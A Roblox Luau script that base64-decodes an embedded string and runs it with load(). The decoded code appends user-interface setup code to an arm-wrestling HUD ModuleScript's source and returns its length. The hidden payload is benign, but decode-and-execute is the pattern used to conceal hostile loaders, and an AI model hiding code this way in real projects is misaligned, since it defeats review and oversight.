local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local lookup = {}
for i = 1, #alphabet do
	lookup[string.byte(alphabet, i)] = i - 1
end
local function b64decode(data)
	data = string.gsub(data, "[^A-Za-z0-9+/=]", "")
	local out = table.create(math.ceil(#data * 3 / 4))
	local n = 0
	for i = 1, #data, 4 do
		local a = lookup[string.byte(data, i)] or 0
		local b = lookup[string.byte(data, i + 1)] or 0
		local c = lookup[string.byte(data, i + 2)] or 0
		local d = lookup[string.byte(data, i + 3)] or 0
		n += 1
		out[n] = string.char(bit32.bor(bit32.lshift(a, 2), bit32.rshift(b, 4)))
		if string.sub(data, i + 2, i + 2) ~= "=" then
			n += 1
			out[n] = string.char(bit32.band(bit32.bor(bit32.lshift(b, 4), bit32.rshift(c, 2)), 255))
		end
		if string.sub(data, i + 3, i + 3) ~= "=" then
			n += 1
			out[n] = string.char(bit32.band(bit32.bor(bit32.lshift(c, 6), d), 255))
		end
	end
	return table.concat(out)
end
local src = b64decode("bG9jYWwgbSA9IGdhbWUuUmVwbGljYXRlZFN0b3JhZ2UuQ2xpZW50U2lkZUNvZGUuR3VpU2NyaXB0cy5Nb2R1bGVTY3JpcHQuQXJtV3Jlc3RsZUhVRC5Db21tb24KbS5Tb3VyY2UgLi49IFs9W0d1aSA9IExvY2FsUGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIikKCWxvY2FsIHNjcmVlbkd1aSA9IHBsYXllckd1aTpXYWl0Rm9yQ2hpbGQoU0NSRUVOX0dVSV9OQU1FKSA6OiBTY3JlZW5HdWkKCWxvY2FsIHNjcmVlbkd1aUZ1bGwgPSBwbGF5ZXJHdWk6V2FpdEZvckNoaWxkKFNDUkVFTl9HVUlfRlVMTF9OQU1FKSA6OiBTY3JlZW5HdWkKCWxvY2FsIGd1aSA9IENvbW1vbi5HZXQoc2NyZWVuR3VpLCBIVURfTkFNRSkgOjogRnJhbWUKCWxvY2FsIHRvcCA9IENvbW1vbi5HZXQoc2NyZWVuR3VpRnVsbCwgVE9QX05BTUUpIDo6IEZyYW1lCglDb21tb24uc2NyZWVuR3VpID0gc2NyZWVuR3VpCglDb21tb24uc2NyZWVuR3VpRnVsbCA9IHNjcmVlbkd1aUZ1bGwKCUNvbW1vbi5ndWkgPSBndWkKCUNvbW1vbi50b3AgPSB0b3AKCS0tIOmhtuagj+WcqCBGdWxsIOS4i++8jOeJueaViOWDj+e0oOWAjeeOh+i3nyBGdWxsIOaguee8qeaUvuS4jiBUb3AuVUlTY2FsZQoJX3Jvb3RTY2FsZSA9IHNjcmVlbkd1aUZ1bGw6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJVSVNjYWxlIikKCV9odWRTY2FsZSA9IHRvcDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIlVJU2NhbGUiKQoJX2JpZ1RleHQgPSBDb21tb24uR2V0KGd1aSwgIkJpZ1RleHQiLCAiTGFiZWwiKSA6OiBUZXh0TGFiZWwKCV9wcmVsb2FkSWNvbnMoKQoJU3R5bGUuQmluZEljb25zKGd1aSkKCVN0eWxlLkJpbmRJY29ucyh0b3ApCglyZXR1cm4gZ3VpCmVuZAoKcmV0dXJuIENvbW1vbgpdPV0KcmV0dXJuICNtLlNvdXJjZQo=")
local fn, err = load(src)
assert(fn, err)
return fn()
